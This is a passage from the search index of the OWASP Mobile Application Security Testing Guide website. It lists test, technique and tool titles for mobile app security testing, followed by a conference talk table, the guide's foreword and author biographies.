Rogue Access Point          </li> <li>            MASTG-TECH-0125: Intercepting Xamarin Traffic          </li> <li>            MASTG-TECH-0126: Obtaining App Permissions          </li> <li>            MASTG-TECH-0127: Inspecting an App's Backup Data          </li> <li>            MASTG-TECH-0128: Performing a Backup and Restore of App Data          </li> <li>            MASTG-TECH-0129: Verifying Android Dependencies at Runtime          </li> <li>            MASTG-TECH-0130: Software Composition Analysis (SCA) of Android Dependencies by Creating a SBOM          </li> <li>            MASTG-TECH-0131: Software Composition Analysis (SCA) of Android Dependencies at Build Time          </li> <li>            MASTG-TECH-0132: Software Composition Analysis (SCA) of iOS Dependencies by Creating a SBOM          </li> <li>            MASTG-TECH-0133: Software Composition Analysis (SCA) of iOS Dependencies by Scanning Package Manager Artifacts          </li> <li>            MASTG-TECH-0134: Monitoring the Pasteboard          </li> <li>            MASTG-TECH-0135: Bypassing Biometric Authentication          </li> <li>            MASTG-TECH-0136: Retrieving PrivacyInfo.xcprivacy Files          </li> <li>            MASTG-TECH-0137: Analyzing PrivacyInfo.xcprivacy Files          </li> <li>            MASTG-TECH-0138: Convert Plist Files to JSON          </li> <li>            MASTG-TECH-0139: Attach to WKWebView          </li> </ul>","tags":[]},{"location":"tags/#tag:test","title":"test","text":"<ul> <li>            MASTG-TEST-0001: Testing Local Storage for Sensitive Data          </li> <li>            MASTG-TEST-0002: Testing Local Storage for Input Validation          </li> <li>            MASTG-TEST-0003: Testing Logs for Sensitive Data          </li> <li>            MASTG-TEST-0004: Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services          </li> <li>            MASTG-TEST-0005: Determining Whether Sensitive Data Is Shared with Third Parties via Notifications          </li> <li>            MASTG-TEST-0006: Determining Whether the Keyboard Cache Is Disabled for Text Input Fields          </li> <li>            MASTG-TEST-0007: Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms          </li> <li>            MASTG-TEST-0008: Checking for Sensitive Data Disclosure Through the User Interface          </li> <li>            MASTG-TEST-0009: Testing Backups for Sensitive Data          </li> <li>            MASTG-TEST-0010: Finding Sensitive Information in Auto-Generated Screenshots          </li> <li>            MASTG-TEST-0011: Testing Memory for Sensitive Data          </li> <li>            MASTG-TEST-0012: Testing the Device-Access-Security Policy          </li> <li>            MASTG-TEST-0013: Testing Symmetric Cryptography          </li> <li>            MASTG-TEST-0014: Testing the Configuration of Cryptographic Standard Algorithms          </li> <li>            MASTG-TEST-0015: Testing the Purposes of Keys          </li> <li>            MASTG-TEST-0016: Testing Random Number Generation          </li> <li>            MASTG-TEST-0017: Testing Confirm Credentials          </li> <li>            MASTG-TEST-0018: Testing Biometric Authentication          </li> <li>            MASTG-TEST-0019: Testing Data Encryption on the Network          </li> <li>            MASTG-TEST-0020: Testing the TLS Settings          </li> <li>            MASTG-TEST-0021: Testing Endpoint Identify Verification          </li> <li>            MASTG-TEST-0022: Testing Custom Certificate Stores and Certificate Pinning          </li> <li>            MASTG-TEST-0023: Testing the Security Provider          </li> <li>            MASTG-TEST-0024: Testing for App Permissions          </li> <li>            MASTG-TEST-0025: Testing for Injection Flaws          </li> <li>            MASTG-TEST-0026: Testing Implicit Intents          </li> <li>            MASTG-TEST-0027: Testing for URL Loading in WebViews          </li> <li>            MASTG-TEST-0028: Testing Deep Links          </li> <li>            MASTG-TEST-0029: Testing for Sensitive Functionality Exposure Through IPC          </li> <li>            MASTG-TEST-0030: Testing for Vulnerable Implementation of PendingIntent          </li> <li>            MASTG-TEST-0031: Testing JavaScript Execution in WebViews          </li> <li>            MASTG-TEST-0032: Testing WebView Protocol Handlers          </li> <li>            MASTG-TEST-0033: Testing for Java Objects Exposed Through WebViews          </li> <li>            MASTG-TEST-0034: Testing Object Persistence          </li> <li>            MASTG-TEST-0035: Testing for Overlay Attacks          </li> <li>            MASTG-TEST-0036: Testing Enforced Updating          </li> <li>            MASTG-TEST-0037: Testing WebViews Cleanup          </li> <li>            MASTG-TEST-0038: Making Sure that the App is Properly Signed          </li> <li>            MASTG-TEST-0039: Testing whether the App is Debuggable          </li> <li>            MASTG-TEST-0040: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0041: Testing for Debugging Code and Verbose Error Logging          </li> <li>            MASTG-TEST-0042: Checking for Weaknesses in Third Party Libraries          </li> <li>            MASTG-TEST-0043: Memory Corruption Bugs          </li> <li>            MASTG-TEST-0044: Make Sure That Free Security Features Are Activated          </li> <li>            MASTG-TEST-0045: Testing Root Detection          </li> <li>            MASTG-TEST-0046: Testing Anti-Debugging Detection          </li> <li>            MASTG-TEST-0047: Testing File Integrity Checks          </li> <li>            MASTG-TEST-0048: Testing Reverse Engineering Tools Detection          </li> <li>            MASTG-TEST-0049: Testing Emulator Detection          </li> <li>            MASTG-TEST-0050: Testing Runtime Integrity Checks          </li> <li>            MASTG-TEST-0051: Testing Obfuscation          </li> <li>            MASTG-TEST-0052: Testing Local Data Storage          </li> <li>            MASTG-TEST-0053: Checking Logs for Sensitive Data          </li> <li>            MASTG-TEST-0054: Determining Whether Sensitive Data Is Shared with Third Parties          </li> <li>            MASTG-TEST-0055: Finding Sensitive Data in the Keyboard Cache          </li> <li>            MASTG-TEST-0056: Determining Whether Sensitive Data Is Exposed via IPC Mechanisms          </li> <li>            MASTG-TEST-0057: Checking for Sensitive Data Disclosed Through the User Interface          </li> <li>            MASTG-TEST-0058: Testing Backups for Sensitive Data          </li> <li>            MASTG-TEST-0059: Testing Auto-Generated Screenshots for Sensitive Information          </li> <li>            MASTG-TEST-0060: Testing Memory for Sensitive Data          </li> <li>            MASTG-TEST-0061: Verifying the Configuration of Cryptographic Standard Algorithms          </li> <li>            MASTG-TEST-0062: Testing Key Management          </li> <li>            MASTG-TEST-0063: Testing Random Number Generation          </li> <li>            MASTG-TEST-0064: Testing Biometric Authentication          </li> <li>            MASTG-TEST-0065: Testing Data Encryption on the Network          </li> <li>            MASTG-TEST-0066: Testing the TLS Settings          </li> <li>            MASTG-TEST-0067: Testing Endpoint Identity Verification          </li> <li>            MASTG-TEST-0068: Testing Custom Certificate Stores and Certificate Pinning          </li> <li>            MASTG-TEST-0069: Testing App Permissions          </li> <li>            MASTG-TEST-0070: Testing Universal Links          </li> <li>            MASTG-TEST-0071: Testing UIActivity Sharing          </li> <li>            MASTG-TEST-0072: Testing App Extensions          </li> <li>            MASTG-TEST-0073: Testing UIPasteboard          </li> <li>            MASTG-TEST-0075: Testing Custom URL Schemes          </li> <li>            MASTG-TEST-0076: Testing iOS WebViews          </li> <li>            MASTG-TEST-0077: Testing WebView Protocol Handlers          </li> <li>            MASTG-TEST-0078: Determining Whether Native Methods Are Exposed Through WebViews          </li> <li>            MASTG-TEST-0079: Testing Object Persistence          </li> <li>            MASTG-TEST-0080: Testing Enforced Updating          </li> <li>            MASTG-TEST-0081: Making Sure that the App Is Properly Signed          </li> <li>            MASTG-TEST-0082: Testing whether the App is Debuggable          </li> <li>            MASTG-TEST-0083: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0084: Testing for Debugging Code and Verbose Error Logging          </li> <li>            MASTG-TEST-0085: Checking for Weaknesses in Third Party Libraries          </li> <li>            MASTG-TEST-0086: Memory Corruption Bugs          </li> <li>            MASTG-TEST-0087: Make Sure That Free Security Features Are Activated          </li> <li>            MASTG-TEST-0088: Testing Jailbreak Detection          </li> <li>            MASTG-TEST-0089: Testing Anti-Debugging Detection          </li> <li>            MASTG-TEST-0090: Testing File Integrity Checks          </li> <li>            MASTG-TEST-0091: Testing Reverse Engineering Tools Detection          </li> <li>            MASTG-TEST-0092: Testing Emulator Detection          </li> <li>            MASTG-TEST-0093: Testing Obfuscation          </li> <li>            MASTG-TEST-0200: Files Written to External Storage          </li> <li>            MASTG-TEST-0201: Runtime Use of APIs to Access External Storage          </li> <li>            MASTG-TEST-0202: References to APIs and Permissions for Accessing External Storage          </li> <li>            MASTG-TEST-0203: Runtime Use of Logging APIs          </li> <li>            MASTG-TEST-0204: Insecure Random API Usage          </li> <li>            MASTG-TEST-0205: Non-random Sources Usage          </li> <li>            MASTG-TEST-0206: Sensitive Data in Network Traffic Capture          </li> <li>            MASTG-TEST-0207: Data Stored in the App Sandbox at Runtime          </li> <li>            MASTG-TEST-0208: Insufficient Key Sizes          </li> <li>            MASTG-TEST-0209: Insufficient Key Sizes          </li> <li>            MASTG-TEST-0210: Broken Symmetric Encryption Algorithms          </li> <li>            MASTG-TEST-0211: Broken Hashing Algorithms          </li> <li>            MASTG-TEST-0212: Use of Hardcoded Cryptographic Keys in Code          </li> <li>            MASTG-TEST-0213: Use of Hardcoded Cryptographic Keys in Code          </li> <li>            MASTG-TEST-0214: Hardcoded Cryptographic Keys in Files          </li> <li>            MASTG-TEST-0215: Sensitive Data Not Excluded From Backup          </li> <li>            MASTG-TEST-0216: Sensitive Data Not Excluded From Backup          </li> <li>            MASTG-TEST-0217: Insecure TLS Protocols Explicitly Allowed in Code          </li> <li>            MASTG-TEST-0218: Insecure TLS Protocols in Network Traffic          </li> <li>            MASTG-TEST-0219: Testing for Debugging Symbols          </li> <li>            MASTG-TEST-0220: Usage of Outdated Code Signature Format          </li> <li>            MASTG-TEST-0221: Broken Symmetric Encryption Algorithms          </li> <li>            MASTG-TEST-0222: Position Independent Code (PIC) Not Enabled          </li> <li>            MASTG-TEST-0223: Stack Canaries Not Enabled          </li> <li>            MASTG-TEST-0224: Usage of Insecure Signature Version          </li> <li>            MASTG-TEST-0225: Usage of Insecure Signature Key Size          </li> <li>            MASTG-TEST-0226: Debuggable Flag Enabled in the AndroidManifest          </li> <li>            MASTG-TEST-0227: Debugging Enabled for WebViews          </li> <li>            MASTG-TEST-0228: Position Independent Code (PIC) not Enabled          </li> <li>            MASTG-TEST-0229: Stack Canaries Not enabled          </li> <li>            MASTG-TEST-0230: Automatic Reference Counting (ARC) not enabled          </li> <li>            MASTG-TEST-0231: References to Logging APIs          </li> <li>            MASTG-TEST-0232: Broken Symmetric Encryption Modes          </li> <li>            MASTG-TEST-0233: Hardcoded HTTP URLs          </li> <li>            MASTG-TEST-0234: Missing Implementation of Server Hostname Verification with SSLSockets          </li> <li>            MASTG-TEST-0235: Android App Configurations Allowing Cleartext Traffic          </li> <li>            MASTG-TEST-0236: Cleartext Traffic Observed on the Network          </li> <li>            MASTG-TEST-0237: Cross-Platform Framework Configurations Allowing Cleartext Traffic          </li> <li>            MASTG-TEST-0238: Runtime Use of Network APIs Transmitting Cleartext Traffic          </li> <li>            MASTG-TEST-0239: Using low-level APIs (e.g. Socket) to set up a custom HTTP connection          </li> <li>            MASTG-TEST-0240: Jailbreak Detection in Code          </li> <li>            MASTG-TEST-0241: Runtime Use of Jailbreak Detection Techniques          </li> <li>            MASTG-TEST-0242: Missing Certificate Pinning in Network Security Configuration          </li> <li>            MASTG-TEST-0243: Expired Certificate Pins in the Network Security Configuration          </li> <li>            MASTG-TEST-0244: Missing Certificate Pinning in Network Traffic          </li> <li>            MASTG-TEST-0245: References to Platform Version APIs          </li> <li>            MASTG-TEST-0246: Runtime Use of Secure Screen Lock Detection APIs          </li> <li>            MASTG-TEST-0247: References to APIs for Detecting Secure Screen Lock          </li> <li>            MASTG-TEST-0248: References to APIs for Detecting Secure Screen Lock          </li> <li>            MASTG-TEST-0249: Runtime Use of Secure Screen Lock Detection APIs          </li> <li>            MASTG-TEST-0250: References to Content Provider Access in WebViews          </li> <li>            MASTG-TEST-0251: Runtime Use of Content Provider Access APIs in WebViews          </li> <li>            MASTG-TEST-0252: References to Local File Access in WebViews          </li> <li>            MASTG-TEST-0253: Runtime Use of Local File Access APIs in WebViews          </li> <li>            MASTG-TEST-0254: Dangerous App Permissions          </li> <li>            MASTG-TEST-0255: Permission Requests Not Minimized          </li> <li>            MASTG-TEST-0256: Missing Permission Rationale          </li> <li>            MASTG-TEST-0257: Not Resetting Unused Permissions          </li> <li>            MASTG-TEST-0258: References to Keyboard Caching Attributes in UI Elements          </li> <li>            MASTG-TEST-0261: Debuggable Entitlement Enabled in the entitlements.plist          </li> <li>            MASTG-TEST-0262: References to Backup Configurations Not Excluding Sensitive Data          </li> <li>            MASTG-TEST-0263: Logging of StrictMode Violations          </li> <li>            MASTG-TEST-0264: Runtime Use of StrictMode APIs          </li> <li>            MASTG-TEST-0265: References to StrictMode APIs          </li> <li>            MASTG-TEST-0266: References to APIs for Event-Bound Biometric Authentication          </li> <li>            MASTG-TEST-0267: Runtime Use Of Event-Bound Biometric Authentication          </li> <li>            MASTG-TEST-0268: References to APIs Allowing Fallback to Non-Biometric Authentication          </li> <li>            MASTG-TEST-0269: Runtime Use Of APIs Allowing Fallback to Non-Biometric Authentication          </li> <li>            MASTG-TEST-0270: References to APIs Detecting Biometric Enrollment Changes          </li> <li>            MASTG-TEST-0271: Runtime Use Of APIs Detecting Biometric Enrollment Changes          </li> <li>            MASTG-TEST-0272: Identify Dependencies with Known Vulnerabilities in the Android Project          </li> <li>            MASTG-TEST-0273: Identify Dependencies with Known Vulnerabilities by Scanning Dependency Managers Artifacts          </li> <li>            MASTG-TEST-0274: Dependencies with Known Vulnerabilities in the App's SBOM          </li> <li>            MASTG-TEST-0275: Dependencies with Known Vulnerabilities in the App's SBOM          </li> <li>            MASTG-TEST-0276: Use of the iOS General Pasteboard          </li> <li>            MASTG-TEST-0277: Sensitive Data in the iOS General Pasteboard at Runtime          </li> <li>            MASTG-TEST-0278: Pasteboard Contents Not Cleared After Use          </li> <li>            MASTG-TEST-0279: Pasteboard Contents Not Expiring          </li> <li>            MASTG-TEST-0280: Pasteboard Contents Not Restricted to Local Device          </li> <li>            MASTG-TEST-0281: Undeclared Known Tracking Domains          </li> <li>            MASTG-TEST-0282: Unsafe Custom Trust Evaluation          </li> <li>            MASTG-TEST-0283: Incorrect Implementation of Server Hostname Verification          </li> <li>            MASTG-TEST-0284: Incorrect SSL Error Handling in WebViews          </li> <li>            MASTG-TEST-0285: Outdated Android Version Allowing Trust in User-Provided CAs          </li> <li>            MASTG-TEST-0286: Network Security Configuration Allowing Trust in User-Provided CAs          </li> <li>            MASTG-TEST-0287: Sensitive Data Stored Unencrypted via the SharedPreferences API to the App Sandbox          </li> </ul>","tags":[]},{"location":"tags/#tag:tool","title":"tool","text":"<ul> <li>            MASTG-TOOL-0001: Frida for Android          </li> <li>            MASTG-TOOL-0002: MobSF for Android          </li> <li>            MASTG-TOOL-0003: nm - Android          </li> <li>            MASTG-TOOL-0004: adb          </li> <li>            MASTG-TOOL-0005: Android NDK          </li> <li>            MASTG-TOOL-0006: Android SDK          </li> <li>            MASTG-TOOL-0007: Android Studio          </li> <li>            MASTG-TOOL-0008: Android-SSL-TrustKiller          </li> <li>            MASTG-TOOL-0009: APKiD          </li> <li>            MASTG-TOOL-0010: APKLab          </li> <li>            MASTG-TOOL-0011: Apktool          </li> <li>            MASTG-TOOL-0012: apkx          </li> <li>            MASTG-TOOL-0013: Busybox          </li> <li>            MASTG-TOOL-0014: Bytecode Viewer          </li> <li>            MASTG-TOOL-0015: drozer          </li> <li>            MASTG-TOOL-0016: gplaycli          </li> <li>            MASTG-TOOL-0017: House          </li> <li>            MASTG-TOOL-0018: jadx          </li> <li>            MASTG-TOOL-0019: jdb          </li> <li>            MASTG-TOOL-0020: JustTrustMe          </li> <li>            MASTG-TOOL-0021: Magisk          </li> <li>            MASTG-TOOL-0022: Proguard          </li> <li>            MASTG-TOOL-0023: RootCloak Plus          </li> <li>            MASTG-TOOL-0024: Scrcpy          </li> <li>            MASTG-TOOL-0025: SSLUnpinning          </li> <li>            MASTG-TOOL-0026: Termux          </li> <li>            MASTG-TOOL-0027: Xposed          </li> <li>            MASTG-TOOL-0028: radare2 for Android          </li> <li>            MASTG-TOOL-0029: objection for Android          </li> <li>            MASTG-TOOL-0030: Angr          </li> <li>            MASTG-TOOL-0031: Frida          </li> <li>            MASTG-TOOL-0032: Frida CodeShare          </li> <li>            MASTG-TOOL-0033: Ghidra          </li> <li>            MASTG-TOOL-0034: LIEF          </li> <li>            MASTG-TOOL-0035: MobSF          </li> <li>            MASTG-TOOL-0036: r2frida          </li> <li>            MASTG-TOOL-0037: RMS Runtime Mobile Security          </li> <li>            MASTG-TOOL-0038: objection          </li> <li>            MASTG-TOOL-0039: Frida for iOS          </li> <li>            MASTG-TOOL-0040: MobSF for iOS          </li> <li>            MASTG-TOOL-0041: nm - iOS          </li> <li>            MASTG-TOOL-0042: BinaryCookieReader          </li> <li>            MASTG-TOOL-0043: class-dump          </li> <li>            MASTG-TOOL-0044: class-dump-z          </li> <li>            MASTG-TOOL-0045: class-dump-dyld          </li> <li>            MASTG-TOOL-0046: Cycript          </li> <li>            MASTG-TOOL-0047: Cydia          </li> <li>            MASTG-TOOL-0048: dsdump          </li> <li>            MASTG-TOOL-0049: Frida-cycript          </li> <li>            MASTG-TOOL-0050: Frida-ios-dump          </li> <li>            MASTG-TOOL-0051: gdb          </li> <li>            MASTG-TOOL-0053: iOSbackup          </li> <li>            MASTG-TOOL-0054: ios-deploy          </li> <li>            MASTG-TOOL-0055: iproxy          </li> <li>            MASTG-TOOL-0056: Keychain-Dumper          </li> <li>            MASTG-TOOL-0057: lldb          </li> <li>            MASTG-TOOL-0058: MachoOView          </li> <li>            MASTG-TOOL-0059: optool          </li> <li>            MASTG-TOOL-0060: otool          </li> <li>            MASTG-TOOL-0061: Grapefruit          </li> <li>            MASTG-TOOL-0062: Plutil          </li> <li>            MASTG-TOOL-0063: security          </li> <li>            MASTG-TOOL-0064: Sileo          </li> <li>            MASTG-TOOL-0065: simctl          </li> <li>            MASTG-TOOL-0066: SSL Kill Switch 3          </li> <li>            MASTG-TOOL-0067: swift-demangle          </li> <li>            MASTG-TOOL-0068: SwiftShield          </li> <li>            MASTG-TOOL-0069: Usbmuxd          </li> <li>            MASTG-TOOL-0070: Xcode          </li> <li>            MASTG-TOOL-0071: Xcode Command Line Tools          </li> <li>            MASTG-TOOL-0072: xcrun          </li> <li>            MASTG-TOOL-0073: radare2 for iOS          </li> <li>            MASTG-TOOL-0074: objection for iOS          </li> <li>            MASTG-TOOL-0075: Android tcpdump          </li> <li>            MASTG-TOOL-0076: bettercap          </li> <li>            MASTG-TOOL-0077: Burp Suite          </li> <li>            MASTG-TOOL-0078: MITM Relay          </li> <li>            MASTG-TOOL-0079: ZAP          </li> <li>            MASTG-TOOL-0080: tcpdump          </li> <li>            MASTG-TOOL-0081: Wireshark          </li> <li>            MASTG-TOOL-0097: mitmproxy          </li> <li>            MASTG-TOOL-0098: iaito          </li> <li>            MASTG-TOOL-0099: FlowDroid          </li> <li>            MASTG-TOOL-0100: reFlutter          </li> <li>            MASTG-TOOL-0101: disable-flutter-tls-verification          </li> <li>            MASTG-TOOL-0102: ios-app-signer          </li> <li>            MASTG-TOOL-0103: uber-apk-signer          </li> <li>            MASTG-TOOL-0104: hermes-dec          </li> <li>            MASTG-TOOL-0105: ipsw          </li> <li>            MASTG-TOOL-0106: Fridump          </li> <li>            MASTG-TOOL-0107: JNITrace          </li> <li>            MASTG-TOOL-0108: Corellium          </li> <li>            MASTG-TOOL-0109: Nope-Proxy          </li> <li>            MASTG-TOOL-0110: semgrep          </li> <li>            MASTG-TOOL-0111: ldid          </li> <li>            MASTG-TOOL-0112: pidcat          </li> <li>            MASTG-TOOL-0114: codesign          </li> <li>            MASTG-TOOL-0115: HTTP Toolkit          </li> <li>            MASTG-TOOL-0116: Blutter          </li> <li>            MASTG-TOOL-0117: fastlane          </li> <li>            MASTG-TOOL-0118: Sideloadly          </li> <li>            MASTG-TOOL-0120: ProxyDroid          </li> <li>            MASTG-TOOL-0121: objdump - iOS          </li> <li>            MASTG-TOOL-0122: c++filt          </li> <li>            MASTG-TOOL-0123: apksigner          </li> <li>            MASTG-TOOL-0124: aapt2          </li> <li>            MASTG-TOOL-0125: Apkleaks          </li> <li>            MASTG-TOOL-0126: libimobiledevice suite          </li> <li>            MASTG-TOOL-0127: AppSync Unified          </li> <li>            MASTG-TOOL-0128: Filza          </li> <li>            MASTG-TOOL-0129: rabin2          </li> <li>            MASTG-TOOL-0130: blint          </li> <li>            MASTG-TOOL-0131: dependency-check          </li> <li>            MASTG-TOOL-0132: dependency-track          </li> <li>            MASTG-TOOL-0133: Visual Studio Code (vscode)          </li> <li>            MASTG-TOOL-0134: cdxgen          </li> <li>            MASTG-TOOL-0135: PlistBuddy          </li> <li>            MASTG-TOOL-0136: plistlib          </li> <li>            MASTG-TOOL-0137: GlobalWebInspect          </li> <li>            MASTG-TOOL-0138: ipainstaller          </li> <li>            MASTG-TOOL-0139: ElleKit          </li> <li>            MASTG-TOOL-0140: frida-multiple-unpinning          </li> <li>            MASTG-TOOL-0141: IOSSecuritySuite          </li> <li>            MASTG-TOOL-0142: Choicy          </li> <li>            MASTG-TOOL-0143: badssl          </li> </ul>","tags":[]},{"location":"talks/","title":"\ud83c\udf99 Talks","text":"Date Event Title Video Slides May 29, 2025 OWASP AppSec EU 2024 Hack-Proof Your Code: Exploring Mobile App Weaknesses with OWASP MAS Not yet available  Slides November 9, 2024 r2con Barcelona Hack-Proof Your Mobile Apps  Video  Slides September 26, 2024 OWASP AppSec US 2024 - San Francisco OWASP Mobile Application Security  Video  Slides August 22, 2024 OWASP Atlanta Chapter Hack-Proof Your Code: Exploring Mobile App Weaknesses with OWASP MAS  Video  Slides June 2024 OWASP AppSec EU 2024 OWASP MAS: A look into the new Mobile App Weaknesses &amp; Tests  Video  Slides June 2024 NSConnect OWASP Mobile Power up: A look into the New MAS Risks &amp; Tests  Video  Slides October 2023 OWASP AppSec US 2023 Refactoring Mobile App Security  Video  Slides October 2023 OWASP AppSec US 2023 OWASP MAS Project Showcase  Video  Slides February 2023 Tech Talks by NowSecure OWASP MASVS v2 Updates  Video  Slides February 2023 OWASP AppSec EU 2023 Mobile Wanderlust\u201d! Our journey to Version 2.0!  Video  Slides November 2022 OWASP AppSec US 2022 Mobile Wanderlust\u201d! Our journey to Version 2.0!  Video  Slides October 2022 NSConnect Inside the OWASP MASVS Refactor v2.0  Video  Slides October 2022 Cybersec Chile Securing Mobile Apps with the OWASP MASVS and MASTG: Secure Storage and IPC N/A  Slides September 2022 OWASP Global AppSec APAC Securing Mobile Apps with the OWASP MASVS and MASTG. Our journey to Version 2.0! Soon  Slides July 2022 droidCon Berlin Securing Mobile Apps with the OWASP MASVS &amp; MSTG  Video  Slides June 2022 OWASP Tunisia Securing Mobile Apps with the MASVS. Our Journey to v2.0  Video  Slides June 2022 OWASP AppSec EU \u201cMobile Wanderlust\u201d! Our journey to Version 2.0!  Video  Slides February 2022 OWASP Toronto Insider's Guide to Mobile AppSec with OWASP MASVS  Video N/A November 2021 NSConnect MASVS &amp; MSTG Refactoring  Video  Slides September 2021 OWASP 20th Anniversary MASVS &amp; MSTG Refactoring  Video  Slides September 2020 Ekoparty Security Conference (Spanish) OWASP Mobile Project and how to use it for white hat hacking  Video  Slides May 2020 OWASP Dutch Virtual chapter meetup MSTG Update  Video N/A February 2020 OWASP New Zealand Day Building Secure Mobile Apps (you don\u2019t have to learn it the hard way!) N/A N/A January 2020 iOS Conf Singapore Building Secure iOS Apps (you don\u2019t have to learn it the hard way!)  Video  Slides October 2019 OWASP AppSec Day Melbourne Fixing Mobile AppSec  Video N/A September 2019 OWASP Global AppSec Amsterdam Fast Forwarding mobile security with the OWASP Mobile Security Testing Guide N/A N/A September 2019 r2con in Barcelona radare2 and Frida in the OWASP Mobile Security Testing Guide  Video  Slides Summer 2019 Open Security summit 2019 Open Security summit 2019 N/A  Slides April 2019 OWASP Kyiv OWASP MSTG in real life N/A N/A March 2019 AppDevcon (Amsterdam) Securing your mobile app with the OWASP Mobile Security Testing Guide N/A N/A November 2018 OWASP BeNeLux days 2018 Fast forwarding mobile security with the MSTG N/A  Slides November 2018 OWASP Germany Day 2018 Introduction to Mobile Security Testing: Approaches and Examples using OWASP MSTG (in German)  Video  Slides October 2018 DBS AppSecCon (Singapore) Fixing Mobile AppSec N/A N/A October 2018 OWASP Bay Area Chapter Mobile Testing Workshop N/A N/A October 2018 OWASP AppSec USA Fixing Mobile AppSec N/A N/A October 2018 CSC 2018 A Perspective on Mobile Security in IoT and how OWASP can Help N/A  Slides January 2018 OWASP North Sweden Umea Mobile Security Essentials N/A N/A January 2018 OWASP Gothenburg Mobile Security Essentials: All about the keying material  Video N/A January 2018 OWASP Gothenburg Mobile Security Essentials: Introduction into OMTG  Video N/A 2017 OWASP Day Indonesia 2017 Fixing Mobile AppSec N/A N/A 2017 OWASP Poland Day 2017 Testing Mobile Applications N/A  Slides 2017 OWASP AppSec EU 2017 Fixing Mobile AppSec  Video  Slides","tags":[]},{"location":"MASTG/","title":"OWASP MASTG","text":"<p> GitHub Repo</p> <p>The OWASP Mobile Application Security Testing Guide (MASTG) is a comprehensive manual for mobile app security testing and reverse engineering. It describes technical processes for verifying the controls listed in the OWASP MASVS through the weaknesses defined by the OWASP MASWE.</p> <p></p> <p></p> <p>Start exploring the MASTG:</p> <p>  Knowledge   Tests   Techniques   Demos   Tools   Apps   Best Practices</p> <p></p>","tags":[]},{"location":"MASTG/0x01-Foreword/","title":"Foreword","text":"<p>Welcome to the OWASP Mobile Application Security Testing Guide. Feel free to explore the existing content, but do note that it may change at any time. New APIs and best practices are introduced in iOS and Android with every major (and minor) release and also vulnerabilities are found every day.</p> <p>If you have feedback or suggestions, or want to contribute, create an issue on GitHub or ping us on Slack. See the README for instructions:</p> <p>https://www.github.com/OWASP/mastg/</p> <p>squirrel (noun plural): Any arboreal sciurine rodent of the genus Sciurus, such as S. vulgaris (red squirrel) or S. carolinensis (grey squirrel), having a bushy tail and feeding on nuts, seeds, etc.</p> <p>On a beautiful summer day, a group of ~7 young men, a woman, and approximately three squirrels met in a Woburn Forest villa during the OWASP Security Summit 2017. So far, nothing unusual. But little did you know, within the next five days, they would redefine not only mobile application security, but the very fundamentals of book writing itself (ironically, the event took place near Bletchley Park, once the residence and work place of the great Alan Turing).</p> <p>Or maybe that's going too far. But at least, they produced a proof-of-concept for an unusual security book. The Mobile Application Security Testing Guide (MASTG) is an open, agile, crowd-sourced effort, made of the contributions of dozens of authors and reviewers from all over the world.</p> <p>Because this isn't a normal security book, the introduction doesn't list impressive facts and data proving importance of mobile devices in this day and age. It also doesn't explain how mobile application security is broken, and why a book like this was sorely needed, and the authors don't thank their beloved ones without whom the book wouldn't have been possible.</p> <p>We do have a message to our readers however! The first rule of the OWASP Mobile Application Security Testing Guide is: Don't just follow the OWASP Mobile Application Security Testing Guide. True excellence at mobile application security requires a deep understanding of mobile operating systems, coding, network security, cryptography, and a whole lot of other things, many of which we can only touch on briefly in this book. Don't stop at security testing. Write your own apps, compile your own kernels, dissect mobile malware, learn how things tick. And as you keep learning new things, consider contributing to the MASTG yourself! Or, as they say: \"Do a pull request\".</p> <p></p>","tags":[]},{"location":"MASTG/0x02a-Frontispiece/","title":"Frontispiece","text":"","tags":[]},{"location":"MASTG/0x02a-Frontispiece/#about-the-owasp-mastg","title":"About the OWASP MASTG","text":"<p>The OWASP Mobile Application Security Testing Guide (MASTG), which is part of the OWASP Mobile Application Security (MAS) flagship project, is a comprehensive manual covering the processes, techniques, and tools used during mobile application security analysis, as well as an exhaustive set of test cases for verifying the requirements listed in the OWASP Mobile Application Security Verification Standard (MASVS), providing a baseline for complete and consistent security tests.</p> <p>The OWASP MASVS and MASTG are trusted by the following platform providers and standardization, governmental and educational institutions. Learn more.</p> <p> </p>","tags":[]},{"location":"MASTG/0x02a-Frontispiece/#authors","title":"Authors","text":"","tags":[]},{"location":"MASTG/0x02a-Frontispiece/#bernhard-mueller","title":"Bernhard Mueller","text":"<p>Bernhard is a cyber security specialist with a talent for hacking systems of all kinds. During more than a decade in the industry, he has published many zero-day exploits for software such as MS SQL Server, Adobe Flash Player, IBM Director, Cisco VOIP, and ModSecurity. If you can name it, he has probably broken it at least once. BlackHat USA commended his pioneering work in mobile security with a Pwnie Award for Best Research.</p>","tags":[]},{"location":"MASTG/0x02a-Frontispiece/#sven-schleier","title":"Sven Schleier","text":"<p>Sven is an experienced web and mobile penetration tester and assessed everything from historic Flash applications to progressive mobile apps. He is also a security engineer that supported many projects end-to-end during the SDLC to \"build security in\". He was speaking at local and international meetups and conferences and is conducting hands-on workshops about web application and mobile app security.</p>","tags":[]},{"location":"MASTG/0x02a-Frontispiece/#jeroen-willemsen","title":"Jeroen Willemsen","text":"<p>Jeroen is a principal security architect with a passion for mobile security and risk management. He has supported companies as a security coach, a security engineer and as a full-stack developer, which makes him a jack of all trades. He loves explaining technical subjects: from security issues to programming challenges.</p>","tags":[]},{"location":"MASTG/0x02a-Frontispiece/#carlos-holguera","title":"Carlos Holguera","text":"<p>Carlos is a mobile security research engineer who has gained many years of hands-on experience in the field of security testing for mobile apps and embedded systems such as automotive control units and IoT devices. He is passionate about reverse engineering and dynamic instrumentation of mobile apps and is continuously learning and sharing his knowledge.</p>","tags":[]},{"location":"MASTG/0x02a-Frontispiece/#co-authors","title":"Co-Authors","text":"<p>Co-authors have consistently contributed quality content and have at least 2,000 additions logged in the GitHub repository.</p>","tags":[]},{"location":"MASTG/0x02a-Frontispiece/#romuald-szkudlarek","title":"Romuald Szkudlarek","text":"<p>Romuald is a passionate cyber security &amp; privacy professional with over 15 years of experience in the web, mobile, IoT and cloud domains. During his career, he has been dedicating his spare time to a variety of projects with the goal of advancing the sectors of software and security. He is teaching regularly at various institutions. He holds CISSP, CCSP, CSSLP, and CEH credentials.</p>","tags":[]},{"location":"MASTG/0x02a-Frontispiece/#jeroen-beckers","title":"Jeroen Beckers","text":"<p>Jeroen is a mobile security lead responsible for quality assurance on mobile security projects and for R&amp;D on all things mobile. Although he started his career as a programmer, he found that it was more fun to take things apart than to put things together, and the switch to security was quickly made. Ever since his master's 